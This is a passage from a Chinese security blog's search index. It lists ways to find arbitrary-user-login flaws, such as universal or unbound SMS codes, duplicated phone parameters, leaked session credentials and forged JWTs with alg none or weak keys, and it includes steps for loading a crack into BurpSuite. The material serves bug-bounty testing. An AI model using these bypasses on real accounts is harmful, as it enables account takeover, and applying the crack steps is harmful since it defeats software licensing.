存在万能验证码一般是测试为了功能测试方便，设置了诸如000000，123456（六位验证码爆破能发现）之类的万能验证码，项目上线时忘记下掉，导致任意用户登录 ","date":"2024-01-20","objectID":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/:3:3","series":null,"tags":["总结","用户登录"],"title":"任意用户登录漏洞挖掘思路","uri":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/#13-存在万能验证码"},{"categories":["学习"],"content":" 1.4 验证码未绑定用户a.后端仅验证了验证码是否正确，没有验证验证码与获取手机号的对应关系，导致可以先输入自己的手机号A获取验证码，再输入他人手机号B获取验证码后，填写自己手机号A接收到的验证码，达到登录手机号B的目的 b.后端仅验证码了手机号与验证码是否一致，并未校验手机号是否为号主本人的,导致可以使用自己的手机号+验证码绕过。常见于用户绑定的功能处。举个栗子： 某系统输入商户号与手机号可绑定到该用户 通过用户注册的功能处，输入自己的手机号获取验证码 返回绑定功能处，输入任意验证码抓包，将手机号与验证码字段改为自己的手机号+验证码 成功登录他人账号 ","date":"2024-01-20","objectID":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/:3:4","series":null,"tags":["总结","用户登录"],"title":"任意用户登录漏洞挖掘思路","uri":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/#14-验证码未绑定用户"},{"categories":["学习"],"content":" 1.5 获取验证码的手机号字段可双写输入手机号获取验证码时抓包，双写手机号字段，使得两个手机号获取到同一个验证码，便可以登录其他用户 输入自己的手机号抓包，将手机字段后面加一个逗号或者分号后再加一个手机号，或者双写手机号字段phone=13333333333\u0026phone=18888888888，当两个手机号均收到一个验证码时大概率漏洞存在。使用自己的手机号便可以任意登录其他手机号 ","date":"2024-01-20","objectID":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/:3:5","series":null,"tags":["总结","用户登录"],"title":"任意用户登录漏洞挖掘思路","uri":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/#15-获取验证码的手机号字段可双写"},{"categories":["学习"],"content":" 1.6 验证码为空/任意验证码可成功验证比较奇葩的例子，验证码为空时，手机号正确则成功登录（账号密码登录体系也发现过这种情况，空密码的情况下账号存在即登录） ","date":"2024-01-20","objectID":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/:3:6","series":null,"tags":["总结","用户登录"],"title":"任意用户登录漏洞挖掘思路","uri":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/#16-验证码为空任意验证码可成功验证"},{"categories":["学习"],"content":" 2.凭证安全问题导致的任意用户登录","date":"2024-01-20","objectID":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/:4:0","series":null,"tags":["总结","用户登录"],"title":"任意用户登录漏洞挖掘思路","uri":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/#2凭证安全问题导致的任意用户登录"},{"categories":["学习"],"content":" 2.1 凭证泄露 2.1.1 页面缓存被搜索引擎抓取搜索引擎搜索该域名，发现有登录后的页面被抓取，直接访问登录目标账户 2.1.2 httptrace/druid等组件中的凭证泄露 httptracespring的httptrace端点往往会记录用户的会话信息，若发现spring未授权访问且存在类似端点可以访问的话，可尝试获取用户凭证进行登录 duriddruid的session监控若发现有效的会话信息时，可以通过此登录任意用户，将druid的未授权中危漏洞提升至高危 2.1.2 sessionkey泄露微信小程序官方提供了一套微信快捷登录的登录逻辑，用户授权手机号快捷登录时，会将本地的手机号使用sessionkey和iv进行aes加密，后端解密后返回该手机号的登录凭证。当sessionkey发生泄露时，攻击者便可以伪造手机号登录任意手机号 修改任意手机号，利用sessionkey和iv重新加密数据 成功登录他人账号 2.1.3 其他接口中的信息泄露这个一般发现于js或者api-docs中的某些特殊接口，例如getToken之类的，有没有取决于开发有没有开发类似的功能接口 ","date":"2024-01-20","objectID":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/:4:1","series":null,"tags":["总结","用户登录"],"title":"任意用户登录漏洞挖掘思路","uri":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/#21-凭证泄露"},{"categories":["学习"],"content":" 2.1 凭证泄露 2.1.1 页面缓存被搜索引擎抓取搜索引擎搜索该域名，发现有登录后的页面被抓取，直接访问登录目标账户 2.1.2 httptrace/druid等组件中的凭证泄露 httptracespring的httptrace端点往往会记录用户的会话信息，若发现spring未授权访问且存在类似端点可以访问的话，可尝试获取用户凭证进行登录 duriddruid的session监控若发现有效的会话信息时，可以通过此登录任意用户，将druid的未授权中危漏洞提升至高危 2.1.2 sessionkey泄露微信小程序官方提供了一套微信快捷登录的登录逻辑，用户授权手机号快捷登录时，会将本地的手机号使用sessionkey和iv进行aes加密，后端解密后返回该手机号的登录凭证。当sessionkey发生泄露时，攻击者便可以伪造手机号登录任意手机号 修改任意手机号，利用sessionkey和iv重新加密数据 成功登录他人账号 2.1.3 其他接口中的信息泄露这个一般发现于js或者api-docs中的某些特殊接口，例如getToken之类的，有没有取决于开发有没有开发类似的功能接口 ","date":"2024-01-20","objectID":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/:4:1","series":null,"tags":["总结","用户登录"],"title":"任意用户登录漏洞挖掘思路","uri":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/#211-页面缓存被搜索引擎抓取"},{"categories":["学习"],"content":" 2.1 凭证泄露 2.1.1 页面缓存被搜索引擎抓取搜索引擎搜索该域名，发现有登录后的页面被抓取，直接访问登录目标账户 2.1.2 httptrace/druid等组件中的凭证泄露 httptracespring的httptrace端点往往会记录用户的会话信息，若发现spring未授权访问且存在类似端点可以访问的话，可尝试获取用户凭证进行登录 duriddruid的session监控若发现有效的会话信息时，可以通过此登录任意用户，将druid的未授权中危漏洞提升至高危 2.1.2 sessionkey泄露微信小程序官方提供了一套微信快捷登录的登录逻辑，用户授权手机号快捷登录时，会将本地的手机号使用sessionkey和iv进行aes加密，后端解密后返回该手机号的登录凭证。当sessionkey发生泄露时，攻击者便可以伪造手机号登录任意手机号 修改任意手机号，利用sessionkey和iv重新加密数据 成功登录他人账号 2.1.3 其他接口中的信息泄露这个一般发现于js或者api-docs中的某些特殊接口，例如getToken之类的，有没有取决于开发有没有开发类似的功能接口 ","date":"2024-01-20","objectID":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/:4:1","series":null,"tags":["总结","用户登录"],"title":"任意用户登录漏洞挖掘思路","uri":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/#212-httptracedruid等组件中的凭证泄露"},{"categories":["学习"],"content":" 2.1 凭证泄露 2.1.1 页面缓存被搜索引擎抓取搜索引擎搜索该域名，发现有登录后的页面被抓取，直接访问登录目标账户 2.1.2 httptrace/druid等组件中的凭证泄露 httptracespring的httptrace端点往往会记录用户的会话信息，若发现spring未授权访问且存在类似端点可以访问的话，可尝试获取用户凭证进行登录 duriddruid的session监控若发现有效的会话信息时，可以通过此登录任意用户，将druid的未授权中危漏洞提升至高危 2.1.2 sessionkey泄露微信小程序官方提供了一套微信快捷登录的登录逻辑，用户授权手机号快捷登录时，会将本地的手机号使用sessionkey和iv进行aes加密，后端解密后返回该手机号的登录凭证。当sessionkey发生泄露时，攻击者便可以伪造手机号登录任意手机号 修改任意手机号，利用sessionkey和iv重新加密数据 成功登录他人账号 2.1.3 其他接口中的信息泄露这个一般发现于js或者api-docs中的某些特殊接口，例如getToken之类的，有没有取决于开发有没有开发类似的功能接口 ","date":"2024-01-20","objectID":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/:4:1","series":null,"tags":["总结","用户登录"],"title":"任意用户登录漏洞挖掘思路","uri":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/#httptrace"},{"categories":["学习"],"content":" 2.1 凭证泄露 2.1.1 页面缓存被搜索引擎抓取搜索引擎搜索该域名，发现有登录后的页面被抓取，直接访问登录目标账户 2.1.2 httptrace/druid等组件中的凭证泄露 httptracespring的httptrace端点往往会记录用户的会话信息，若发现spring未授权访问且存在类似端点可以访问的话，可尝试获取用户凭证进行登录 duriddruid的session监控若发现有效的会话信息时，可以通过此登录任意用户，将druid的未授权中危漏洞提升至高危 2.1.2 sessionkey泄露微信小程序官方提供了一套微信快捷登录的登录逻辑，用户授权手机号快捷登录时，会将本地的手机号使用sessionkey和iv进行aes加密，后端解密后返回该手机号的登录凭证。当sessionkey发生泄露时，攻击者便可以伪造手机号登录任意手机号 修改任意手机号，利用sessionkey和iv重新加密数据 成功登录他人账号 2.1.3 其他接口中的信息泄露这个一般发现于js或者api-docs中的某些特殊接口，例如getToken之类的，有没有取决于开发有没有开发类似的功能接口 ","date":"2024-01-20","objectID":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/:4:1","series":null,"tags":["总结","用户登录"],"title":"任意用户登录漏洞挖掘思路","uri":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/#durid"},{"categories":["学习"],"content":" 2.1 凭证泄露 2.1.1 页面缓存被搜索引擎抓取搜索引擎搜索该域名，发现有登录后的页面被抓取，直接访问登录目标账户 2.1.2 httptrace/druid等组件中的凭证泄露 httptracespring的httptrace端点往往会记录用户的会话信息，若发现spring未授权访问且存在类似端点可以访问的话，可尝试获取用户凭证进行登录 duriddruid的session监控若发现有效的会话信息时，可以通过此登录任意用户，将druid的未授权中危漏洞提升至高危 2.1.2 sessionkey泄露微信小程序官方提供了一套微信快捷登录的登录逻辑，用户授权手机号快捷登录时，会将本地的手机号使用sessionkey和iv进行aes加密，后端解密后返回该手机号的登录凭证。当sessionkey发生泄露时，攻击者便可以伪造手机号登录任意手机号 修改任意手机号，利用sessionkey和iv重新加密数据 成功登录他人账号 2.1.3 其他接口中的信息泄露这个一般发现于js或者api-docs中的某些特殊接口，例如getToken之类的，有没有取决于开发有没有开发类似的功能接口 ","date":"2024-01-20","objectID":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/:4:1","series":null,"tags":["总结","用户登录"],"title":"任意用户登录漏洞挖掘思路","uri":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/#212-sessionkey泄露"},{"categories":["学习"],"content":" 2.1 凭证泄露 2.1.1 页面缓存被搜索引擎抓取搜索引擎搜索该域名，发现有登录后的页面被抓取，直接访问登录目标账户 2.1.2 httptrace/druid等组件中的凭证泄露 httptracespring的httptrace端点往往会记录用户的会话信息，若发现spring未授权访问且存在类似端点可以访问的话，可尝试获取用户凭证进行登录 duriddruid的session监控若发现有效的会话信息时，可以通过此登录任意用户，将druid的未授权中危漏洞提升至高危 2.1.2 sessionkey泄露微信小程序官方提供了一套微信快捷登录的登录逻辑，用户授权手机号快捷登录时，会将本地的手机号使用sessionkey和iv进行aes加密，后端解密后返回该手机号的登录凭证。当sessionkey发生泄露时，攻击者便可以伪造手机号登录任意手机号 修改任意手机号，利用sessionkey和iv重新加密数据 成功登录他人账号 2.1.3 其他接口中的信息泄露这个一般发现于js或者api-docs中的某些特殊接口，例如getToken之类的，有没有取决于开发有没有开发类似的功能接口 ","date":"2024-01-20","objectID":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/:4:1","series":null,"tags":["总结","用户登录"],"title":"任意用户登录漏洞挖掘思路","uri":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/#213-其他接口中的信息泄露"},{"categories":["学习"],"content":" 2.2 凭证可伪造 2.2.1 jwt未验参/弱密钥系统使用jwt作为认证字段，且其中关键用户信息字段可以遍历时，若未验参或者使用弱密钥时，便可以将用户信息字段进行更改，删除/爆破弱密钥重新生成签名，到达任意用户登录 jwt未验参删除签名部分(或者更改头部中的alg为none再删除签名)，访问登录后的接口成功访问，说明jwt未验参() 遍历data字段即可登录其他用户（此处的data为用户id） jwt弱密钥jwt使用了弱密钥时，爆破到弱密钥后同样修改jwt中的用户信息字段，使用密钥重新生成签名即可获取到其他用户的jwt字段 2.2.2 弱cookie系统使用cookie认证，且cookie字段可伪造 ","date":"2024-01-20","objectID":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/:4:2","series":null,"tags":["总结","用户登录"],"title":"任意用户登录漏洞挖掘思路","uri":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/#22-凭证可伪造"},{"categories":["学习"],"content":" 2.2 凭证可伪造 2.2.1 jwt未验参/弱密钥系统使用jwt作为认证字段，且其中关键用户信息字段可以遍历时，若未验参或者使用弱密钥时，便可以将用户信息字段进行更改，删除/爆破弱密钥重新生成签名，到达任意用户登录 jwt未验参删除签名部分(或者更改头部中的alg为none再删除签名)，访问登录后的接口成功访问，说明jwt未验参() 遍历data字段即可登录其他用户（此处的data为用户id） jwt弱密钥jwt使用了弱密钥时，爆破到弱密钥后同样修改jwt中的用户信息字段，使用密钥重新生成签名即可获取到其他用户的jwt字段 2.2.2 弱cookie系统使用cookie认证，且cookie字段可伪造 ","date":"2024-01-20","objectID":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/:4:2","series":null,"tags":["总结","用户登录"],"title":"任意用户登录漏洞挖掘思路","uri":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/#221-jwt未验参弱密钥"},{"categories":["学习"],"content":" 2.2 凭证可伪造 2.2.1 jwt未验参/弱密钥系统使用jwt作为认证字段，且其中关键用户信息字段可以遍历时，若未验参或者使用弱密钥时，便可以将用户信息字段进行更改，删除/爆破弱密钥重新生成签名，到达任意用户登录 jwt未验参删除签名部分(或者更改头部中的alg为none再删除签名)，访问登录后的接口成功访问，说明jwt未验参() 遍历data字段即可登录其他用户（此处的data为用户id） jwt弱密钥jwt使用了弱密钥时，爆破到弱密钥后同样修改jwt中的用户信息字段，使用密钥重新生成签名即可获取到其他用户的jwt字段 2.2.2 弱cookie系统使用cookie认证，且cookie字段可伪造 ","date":"2024-01-20","objectID":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/:4:2","series":null,"tags":["总结","用户登录"],"title":"任意用户登录漏洞挖掘思路","uri":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/#jwt未验参"},{"categories":["学习"],"content":" 2.2 凭证可伪造 2.2.1 jwt未验参/弱密钥系统使用jwt作为认证字段，且其中关键用户信息字段可以遍历时，若未验参或者使用弱密钥时，便可以将用户信息字段进行更改，删除/爆破弱密钥重新生成签名，到达任意用户登录 jwt未验参删除签名部分(或者更改头部中的alg为none再删除签名)，访问登录后的接口成功访问，说明jwt未验参() 遍历data字段即可登录其他用户（此处的data为用户id） jwt弱密钥jwt使用了弱密钥时，爆破到弱密钥后同样修改jwt中的用户信息字段，使用密钥重新生成签名即可获取到其他用户的jwt字段 2.2.2 弱cookie系统使用cookie认证，且cookie字段可伪造 ","date":"2024-01-20","objectID":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/:4:2","series":null,"tags":["总结","用户登录"],"title":"任意用户登录漏洞挖掘思路","uri":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/#jwt弱密钥"},{"categories":["学习"],"content":" 2.2 凭证可伪造 2.2.1 jwt未验参/弱密钥系统使用jwt作为认证字段，且其中关键用户信息字段可以遍历时，若未验参或者使用弱密钥时，便可以将用户信息字段进行更改，删除/爆破弱密钥重新生成签名，到达任意用户登录 jwt未验参删除签名部分(或者更改头部中的alg为none再删除签名)，访问登录后的接口成功访问，说明jwt未验参() 遍历data字段即可登录其他用户（此处的data为用户id） jwt弱密钥jwt使用了弱密钥时，爆破到弱密钥后同样修改jwt中的用户信息字段，使用密钥重新生成签名即可获取到其他用户的jwt字段 2.2.2 弱cookie系统使用cookie认证，且cookie字段可伪造 ","date":"2024-01-20","objectID":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/:4:2","series":null,"tags":["总结","用户登录"],"title":"任意用户登录漏洞挖掘思路","uri":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/#222-弱cookie"},{"categories":["学习"],"content":" 2.3 凭证过早返回一般正常的登录流程为服务端校验完用户身份后，返回用户凭证，但某些系统由于登录前会有很多的查询用户信息类的功能请求，经常导致在登录验证前就返回了用户凭证。 某金融项目，输入手机号会先去查询手机号是否为已注册用户，是的话进入用户信息查询的逻辑，再跳转登录。在信息查询的阶段过早返回了sessionid,导致任意用户登录 ","date":"2024-01-20","objectID":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/:4:3","series":null,"tags":["总结","用户登录"],"title":"任意用户登录漏洞挖掘思路","uri":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/#23-凭证过早返回"},{"categories":["学习"],"content":" 3.逻辑漏洞导致的任意用户登录","date":"2024-01-20","objectID":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/:5:0","series":null,"tags":["总结","用户登录"],"title":"任意用户登录漏洞挖掘思路","uri":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/#3逻辑漏洞导致的任意用户登录"},{"categories":["学习"],"content":" 3.1 登录完全依赖数据包中的参数且参数可控最常规的任意用户登录漏洞，常见于两步/多步登录的登录逻辑处 以两步登录为例，登录输入账号密码/手机号验证码/其他的凭证信息后第一个请求校验其正确性后，第二个请求根据后端返回的账号/手机号/用户id等字段去获取用户凭证的登录逻辑。 只要修改第一个请求中的返回包或者修改第二个请求中的字段即可 修改第一个请求的返回包当请求字段加密时，此方法非常便捷 以下为例 分析登录流程为，第一个请求请求微信接口获取用户手机号，返回到一个请求的返回包中 第二个请求获取返回包中的手机号加密发给服务端，返回其登录凭证 所以此处只需要替换第一个请求包的返回包中的手机号即可 修改第二个请求的请求包如下登录数据包，直接更改其中手机号即可 ","date":"2024-01-20","objectID":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/:5:1","series":null,"tags":["总结","用户登录"],"title":"任意用户登录漏洞挖掘思路","uri":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/#31-登录完全依赖数据包中的参数且参数可控"},{"categories":["学习"],"content":" 3.1 登录完全依赖数据包中的参数且参数可控最常规的任意用户登录漏洞，常见于两步/多步登录的登录逻辑处 以两步登录为例，登录输入账号密码/手机号验证码/其他的凭证信息后第一个请求校验其正确性后，第二个请求根据后端返回的账号/手机号/用户id等字段去获取用户凭证的登录逻辑。 只要修改第一个请求中的返回包或者修改第二个请求中的字段即可 修改第一个请求的返回包当请求字段加密时，此方法非常便捷 以下为例 分析登录流程为，第一个请求请求微信接口获取用户手机号，返回到一个请求的返回包中 第二个请求获取返回包中的手机号加密发给服务端，返回其登录凭证 所以此处只需要替换第一个请求包的返回包中的手机号即可 修改第二个请求的请求包如下登录数据包，直接更改其中手机号即可 ","date":"2024-01-20","objectID":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/:5:1","series":null,"tags":["总结","用户登录"],"title":"任意用户登录漏洞挖掘思路","uri":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/#修改第一个请求的返回包"},{"categories":["学习"],"content":" 3.1 登录完全依赖数据包中的参数且参数可控最常规的任意用户登录漏洞，常见于两步/多步登录的登录逻辑处 以两步登录为例，登录输入账号密码/手机号验证码/其他的凭证信息后第一个请求校验其正确性后，第二个请求根据后端返回的账号/手机号/用户id等字段去获取用户凭证的登录逻辑。 只要修改第一个请求中的返回包或者修改第二个请求中的字段即可 修改第一个请求的返回包当请求字段加密时，此方法非常便捷 以下为例 分析登录流程为，第一个请求请求微信接口获取用户手机号，返回到一个请求的返回包中 第二个请求获取返回包中的手机号加密发给服务端，返回其登录凭证 所以此处只需要替换第一个请求包的返回包中的手机号即可 修改第二个请求的请求包如下登录数据包，直接更改其中手机号即可 ","date":"2024-01-20","objectID":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/:5:1","series":null,"tags":["总结","用户登录"],"title":"任意用户登录漏洞挖掘思路","uri":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/#修改第二个请求的请求包"},{"categories":["学习"],"content":" 3.2 更改登录type部分系统有免密登录/快捷登录之类的功能，只要一个账号就能登录，当遇到登录数据包中含有type之类的字段时，可以尝试此方法 ","date":"2024-01-20","objectID":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/:5:2","series":null,"tags":["总结","用户登录"],"title":"任意用户登录漏洞挖掘思路","uri":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/#32-更改登录type"},{"categories":["学习"],"content":" 3.3 账号数据覆盖常见于用账号信息更新处，例如修改手机号、账户重新绑定功能、修改账号等功能点处 以修改手机号为例，此处修改需要输入新手机号与新手机号的验证码 修改请求中的oldmobile字段为其他手机号，成功将其他用户的账户数据覆盖到新手机号中，达到任意用户登录 ","date":"2024-01-20","objectID":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/:5:3","series":null,"tags":["总结","用户登录"],"title":"任意用户登录漏洞挖掘思路","uri":"/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/#33-账号数据覆盖"},{"categories":["工具"],"content":" 下载 BurpSuite 注册启动汉化 ","date":"2023-12-03","objectID":"/burpsuite%E5%AE%89%E8%A3%85/:1:0","series":null,"tags":["BurpSuite"],"title":"BurpSuite安装","uri":"/burpsuite%E5%AE%89%E8%A3%85/#下载"},{"categories":["工具"],"content":" 安装 安装完成后先启动一次 BurpSuite 然后关闭，否则会报错损坏 在应用程序中找到 BurpSuite 右键 \u003e 显示包内容 依次打开文件夹 \u003e Contents/Resources/app，把启动器放入其中 返回到Contents目录，编辑 vmoptions.txt，末尾追加内容 ","date":"2023-12-03","objectID":"/burpsuite%E5%AE%89%E8%A3%85/:2:0","series":null,"tags":["BurpSuite"],"title":"BurpSuite安装","uri":"/burpsuite%E5%AE%89%E8%A3%85/#安装"},{"categories":["工具"],"content":" 配置 --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/jdk.internal.org.objectweb.asm=ALL-UNNAMED --add-opens=java.base/jdk.internal.org.objectweb.asm.tree=ALL-UNNAMED --add-opens=java.base/jdk.internal.org.objectweb.asm.Opcodes=ALL-UNNAMED -javaagent:burpsuitloader-all.jar -noverify ","date":"2023-12-03","objectID":"/burpsuite%E5%AE%89%E8%A3%85/:3:0","series":null,"tags":["BurpSuite"],"title":"BurpSuite安装","uri":"/burpsuite%E5%AE%89%E8%A3%85/#配置"},{"categories":["学习"],"content":" 转载自： https://xz.aliyun.com/t/8501 一个SRC混子挖SRC的半年经验分享~,基本都是文字阐述，希望能给同样在挖洞的师傅们带来一点新收获。 ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:0","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#"},{"categories":["学习"],"content":" 